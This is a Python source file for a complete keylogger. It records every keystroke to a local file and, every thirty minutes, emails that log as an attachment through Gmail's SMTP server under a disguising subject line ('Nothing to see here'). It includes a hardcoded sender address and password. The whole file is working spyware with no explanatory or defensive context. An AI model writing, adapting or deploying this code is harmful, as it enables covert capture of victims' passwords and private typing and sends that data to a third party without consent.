import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pynput.keyboard import Key, Listener
from pynput import keyboard
import logging
import time

directory = "important.txt"
logging.basicConfig(filename=directory, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def keyPress(key):
    logging.info(str(key))

listener = keyboard.Listener(
    on_press=keyPress
)

listener.start()

while True:
    msg = MIMEMultipart()
    msg['From'] = "testsat3812@gmail.com"
    msg['To'] = "testsat3812@gmail.com"
    msg['Subject'] = "Nothing to see here"
    body = "Seriously, there's nothing to see here"
    msg.attach(MIMEText(body, 'plain'))
    
    time.sleep(60 * 30)

    attachment = open(directory, "rb")
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())

    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % directory)
    msg.attach(p)
    s = smtplib.SMTP("smtp.gmail.com", 587)

    s.starttls()
    s.login(msg['From'], "SATTEST3812!")
    text = msg.as_string()

    s.sendmail(msg['From'], msg['To'], text)
    s.quit()
